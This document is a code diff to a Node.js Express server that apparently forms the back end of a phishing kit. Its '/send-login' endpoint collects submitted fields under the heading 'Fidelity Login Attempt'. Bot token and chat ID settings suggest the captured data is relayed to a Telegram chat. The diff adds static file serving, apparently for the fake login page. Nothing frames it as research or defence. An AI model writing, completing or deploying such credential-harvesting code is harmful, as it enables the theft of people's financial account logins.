@@ -1,5 +1,6 @@
 import express from "express";
 import fetch from "node-fetch"; // or use global fetch in Node 18+
+import path from "path";
 
 const app = express();
 app.use(express.json());
@@ -12,11 +13,13 @@ if (!BOT_TOKEN || !CHAT_ID) {
   process.exit(1);
 }
 
-// Single endpoint to handle both forms
+// Serve static files from the 'public' folder
+app.use(express.static(path.join(process.cwd(), "public")));
+
+// Your existing POST endpoint
 app.post("/send-login", async (req, res) => {
   const data = req.body;
 
-  // Compose message dynamically based on received fields
   let message = "🔐 Fidelity Login Attempt\n";
 
   for (const [key, value] of Object.entries(data)) {
